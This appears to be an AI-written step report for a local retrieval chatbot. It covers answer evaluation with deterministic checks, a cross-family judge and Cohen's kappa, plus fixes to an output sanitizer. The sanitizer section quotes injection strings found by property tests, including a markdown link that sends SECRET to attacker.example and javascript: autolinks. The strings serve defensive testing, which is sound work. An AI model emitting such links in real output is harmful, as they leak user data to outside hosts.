## Goal
PLAN §9 and §11 row S5.2: a measurement hierarchy for answers: retrieval metrics, then **deterministic answer checks** (citation hit, abstention accuracy, must-include recall, invalid-citation rate), then **human labels**, then a **calibrated judge (supporting evidence only)**. The judge is fixed in advance: a non-Gemma model of 12B or fewer, config rejects the generator's family, runs are phased by model (generate all, then judge all), verdicts are cached; ~60 answers labelled blind by a person; **if κ < 0.6 the judge is excluded from headline claims**.

A little context:
- **Every metric here is a floor or an opinion, not a truth.** A deterministic check can be fooled in both directions (an answer can contain the phrase and be wrong around it; a right answer can word it differently); a judge is a model with its own biases. That is why the plan keeps all four rungs and why this report prints them side by side.
- **A judge's agreement is measured with κ, not with agreement.** If 90% of answers are supported, a judge that says "supported" every time agrees with a person 90% of the time and has told us nothing. Cohen's κ subtracts the agreement two raters would reach by chance given how often each says yes.
- **Blind labelling needs a place that cannot leak.** The UI may import neither the storage nor `geekbot.evals` (S4.4's contract), so the label logic (the fixed shuffle, the append-only label file, κ) lives in a small neutral module, `geekbot/labelling.py`, and the page reads only `answers.json`: never the judge's file.

## ✍️ Your pieces
- **`cohens_kappa`** (PLAN §11: "Cohen's κ"): κ = (p_o − p_e) / (1 − p_e), `None` when undefined (no items; both raters constant). Tests: perfect agreement is 1, chance-level agreement is 0, total disagreement of balanced raters is −1, a worked example, the always-yes judge on a lopsided set gets 0 (the reason κ exists), symmetry and bounds as hypothesis properties.
- **`check_judge_family`** (PLAN §11: "the judge-family guard"): refuses a judge of the generator's family before any model is loaded; `model_family` is the tag's name up to the first digit or dash (`gemma4` and `gemma3` are `gemma`, `qwen2.5-coder` and `qwen3` are `qwen`).
- **Help used:** written by Claude (prototyping mode, D-047); on the ✍️ backlog in STATUS.md.

## Results (`evals/results/s52-run1/`)
`gemma4:12b` answered all 100 golden questions through the real graph (retrieval hybrid with the cross-encoder, top-k 5; follow-ups as conversations), then `qwen2.5-coder:7b` judged the 75 answers that were not refusals. **Golden v0 is Claude-authored and provisional (D-067): easy mode, never a headline.** Target profile; the PC was not gated for this run (answer quality does not depend on load).
- **Abstention:** 19 of 20 unanswerable questions refused, 1 answered; 6 of 80 answerable questions refused wrongly (4 single-hop, 2 multi-hop, 0 follow-ups). The abstention evaluation of Gate A on the same model had 5 of 65 wrong refusals: the difference is run-to-run variation.
- **Citations:** of the 74 answers to answerable questions, **74 cite at least one of the documents the golden item names**; the mean share of the named documents cited is 0.95 (multi-hop 0.85, follow-ups 0.87); **0 of 75 answers carried a citation the check had to remove.** A citation to the right document does not prove the claim is in it.
- **Must-include recall: 0.65 overall, 0.70 single-hop, 0.22 multi-hop, 0.93 follow-ups.** **The multi-hop figure is mostly the check, not the model:** v0's must-include phrases for multi-hop items were written as whole sentences from the documents ("held for 22 minutes", "ordered on 17 March 2025", "restored 310 GB in 47 minutes"), and the check is a strict substring match. Reading the answers: M-002 ("ran for 22 minutes ... 21 minutes") and M-003 ("ordered on 17 March ... approved on 21 March") and M-004 and M-008 are right and score 0. It is a floor; it was fooled in the unkind direction here. For your own golden questions (D-082), short key facts (a number, a name) as phrases make the check say what it means.
- **The judge (`qwen2.5-coder:7b`, family `qwen`, the generator's is `gemma`):** 69 of 75 answers "supported" (single-hop 45 of 46, multi-hop 12 of 13, follow-ups 11 of 15, the one answered unanswerable question: supported); **"answers the question": 67 of 75, but only 7 of 15 for follow-ups**, against a must-include recall of 0.93 for the same answers: **the judge disagrees with the deterministic evidence on follow-ups, so it is probably misreading "And what about X?" without the earlier turn it was shown, or is a weak judge for the job** (a coder model, not the plan's Qwen3 8B class: that model is not pulled and this run may not pull one). **Nothing here validates it.** It is unvalidated until you label.
- **κ: no verdict yet (0 labels).** The report says so next to the judge's numbers.

## A security finding in S3.5's output cleaning (G3), found and fixed here (D-100)
The full test run of this step failed `test_nothing_that_loads_or_leads_outside_survives` (a hypothesis property test of S3.5, random inputs). It had passed in every earlier full run by luck of the draw. Following it up found **six holes in the output cleaning, all fixed in `agent/sanitize.py`, none by weakening a test**:
1. **A removal could join two halves into a construct nobody had judged.** `[click]<img src=a>(https://attacker.example/?d=SECRET)` came out as `[click](https://attacker.example/?d=SECRET)`: a live link to an outside address with data in it (a click away, but exactly what rule 2 forbids); `<IMGjavascript:<img >>` became the autolink `<IMGjavascript:>`. Now, where something was removed and both sides of the hole touch, a blank line goes between them (a space where the join would only make an opener, as before).
2. **A link-reference definition that stayed kept its raw line**: `[<http://e.x>]:` kept an autolink in its label, `[1]:<img ` kept an unfinished tag. The label and the rest of the line are cleaned now (the line break is kept out of that, or an unfinished tag glues the next line on).
3. **Brackets inside an autolink or a tag are not brackets** (`[<IMG:]>` was read as a bracket pair and the autolink survived).
4. **An inner link that closes after its outer label** (`[[](])` is a link to `]`): the outer `[` is made literal.
5. **The inside of a bracket pair and its two neighbours**: a removal at either end of a label could join the bracket to the other side of the hole (`[<javascript:<img <http://e.x>](>`).
6. **Two chunking-invariance flakes** (the streamed text must equal the whole text): a blank line that straddles the construct cap, and a tag whose end has not arrived yet.
One test was made *more precise*, not weaker: its definition pattern now requires a non-empty label (`[]:` is not a definition in markdown). One exact-output expectation changed (`!<img src=x>[a](...)` is now `! a`, was `!a`; still no `[` next to the `!`). New tests: nine attack strings, five label cases, prose-is-untouched cases, a stream cut at the hole, and two `@example`s of the original counterexamples. **The property tests passed in 40 fresh random runs in a row after the last fix (each run asks about 1,500 generated inputs).** What this does *not* show: that no hole is left (a parser of markdown dialects by hand is never finished; the module's "known limits" stand, and the UI renders answers with Streamlit's own renderer, which has its own rules).

## What you do (the user's part)
1. `geekbot up`, open the **Labels** page, label about 60 answers (about an hour; blind, shuffled, one question each: is every claim supported by the sources shown?). The labels go to `evals/labels/labels.jsonl`.
2. `geekbot eval answers --name s52-run1 --phase report` (no GPU): the report then compares the judge with your labels and prints the rule's verdict.
3. If κ is below 0.6, or you want the plan's judge, `ollama pull qwen3:8b` and run `geekbot eval answers --name s52-run2 --judge-model qwen3:8b` (the answers are reused if you pass the same name; the verdicts are cached per judge).
